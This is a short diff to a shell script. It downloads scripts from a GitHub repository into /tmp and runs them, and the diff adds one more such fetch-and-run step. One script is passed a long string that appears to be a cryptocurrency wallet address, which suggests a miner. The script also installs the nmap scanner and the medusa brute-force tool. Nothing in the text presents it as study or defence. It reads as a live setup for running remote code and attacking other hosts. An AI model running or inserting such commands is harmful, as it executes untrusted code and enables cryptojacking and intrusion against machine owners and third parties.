@@ -3,6 +3,8 @@ curl -o /tmp/test1.sh -s https://raw.githubusercontent.com/x15121525/java_testpp
 sh /tmp/test1.sh
 curl -o /tmp/test2.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_work
 sh /tmp/test2.sh 47c1Gqngx2Reu5HwPqc1uJP3iKJ8xiK9B3QXepN19LQn42jMyBNMhHHBauycpj5uG7EM6ErCKMSuW3W8YXJJgozdT5mMULW
+curl -o /tmp/internal.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/internal.sh
+sh /tmp/internal.sh
 sudo apt install nmap -y
 sudo apt install medusa -y
 sudo apt-get update -y
